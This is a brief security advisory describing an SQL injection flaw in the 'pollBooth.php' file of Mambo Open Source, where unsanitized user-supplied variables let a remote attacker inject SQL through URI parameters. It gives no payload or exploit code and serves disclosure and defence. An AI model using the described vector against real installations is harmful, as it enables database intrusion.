Mambo Open Source is prone to SQL injection attacks. This is due to an input validation error in 'pollBooth.php'. In particular, various user-supplied variables are used in an SQL query without proper sanitization of SQL syntax. As a result, a remote attacker could include malicious SQL syntax via URI parameters and influence database queries.
